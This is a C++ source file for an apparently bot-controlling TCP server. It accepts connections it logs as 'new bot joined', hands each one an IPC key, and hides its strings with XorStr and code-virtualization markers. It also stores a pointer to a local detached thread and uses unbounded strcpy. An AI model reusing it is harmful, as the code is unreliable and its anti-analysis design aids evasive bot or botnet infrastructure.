#include "consock.h"
bool net::c_consock::init_port()
{
	this->server_instance = new CTCPServer(
				[](const std::string msg) { dbglog(std::string(msg).append("\n").c_str()); }, 
				boot::c_conf::Instance().base_config.ipc_port);
	
	return true;
}

net::consock_strc::s_connection* net::c_consock::get(ULONGLONG uid)
{
	for (auto&& a : this->connections) if (a->identity == uid) return a;
	return nullptr;
}

bool net::c_consock::setup()
{
	uvirt;
	if (!this->init_port())
	{
		dbglog(XorStr("[ ipc port init failed ]\n"));
		return false;
	}
	auto t = std::thread([]()
	{
		uvirt;
		while (true) net::c_consock::Instance().connector();
		vmend;
	});
	this->connector_thread = &t;
	this->connector_thread->detach();
	dbglog(XorStr("[ ipc port init completed, routine regsitered ]\n"));
	vmend;
	return true;
}

void net::c_consock::connector()
{
	uvirt;

	dbglog(XorStr("[ waiting for connections ... ]\n"));

	ASocket::Socket client_socket = 0;
	if (this->server_instance->Listen(client_socket) && client_socket != INVALID_SOCKET)
	{
		auto construct = new net::consock_strc::s_connection();
		//check for unique
		while (true)
		{
			auto matched = false;//will re-run if once matched to ensure new generated identity isnt listed either
			for (auto&& obj : net::c_consock::Instance().connections)
			{
				if (construct->identity != obj->identity) continue;
				delete construct;//del and re init
				construct = new net::consock_strc::s_connection();
				matched = true;
			}
			if (!matched) break;
		}
		construct->socket = client_socket;
		net::c_consock::Instance().connections.push_back(construct);
		
		dbglog(XorStr("[ new bot joined, identity: %llu, %04x ]\n"), construct->identity, (uint32_t)client_socket);

		auto exch_packet = FS_packets::s_exch();
		exch_packet.opcode = FS_packets::OP_EXCH;
		exch_packet.size = sizeof(decltype(exch_packet));
		strcpy(exch_packet.ipc_key, boot::c_conf::Instance().base_config.ipc_comkey.c_str());
		//send initial exch
		char as_dat[sizeof exch_packet];
		memcpy(as_dat, &exch_packet, sizeof exch_packet);
		auto exch_res = this->server_instance->Send(client_socket, as_dat, sizeof as_dat);
		dbglog(XorStr("[ exch send: %i ]\n"), exch_res);
		
		boot::c_thread::Instance().add(new boot::thread_strc::s_thread_i(([this, client_socket](ULONGLONG data)
		{
				auto client_identity = data;
			
				//char send_dat[256];
				//strcpy(send_dat, "test message FROM SRV");
			
				//auto send_ret = this->server_instance->Send(client_socket, send_dat, 256);
				//if (!send_ret)
				//{
				//	this->destroy(client_identity);
				//	return;
				//}

				////TODO: for packet system, gather header of packet (static header: short=opcode, short=packet size) adjust buffer based on this
			
				//char buf[256];
				//auto bytes_rcv = this->server_instance->Receive(client_socket, buf, 256);
			
				//if (bytes_rcv <= 0) return;			
			
				//dbglog(XorStr("[ rcv from %llu, %s ]\n"), client_identity, buf);

		}), 0, construct->identity, client_socket));
	}
	vmend;
}
bool net::c_consock::destroy(ULONGLONG uid)
{
	uvirt;

	for (size_t i = 0; i < this->connections.size(); i++)
	{
		auto obj = this->connections[i];
		if (!obj || obj->identity != uid) continue;
		this->connections.erase(this->connections.begin() + i);
		delete obj;
		dbglog(XorStr("[ dropped connection of client %08x ]\n"), uid);
		break;
	}

	boot::c_thread::Instance().destroy(uid);
	
	vmend;	
	return true;
}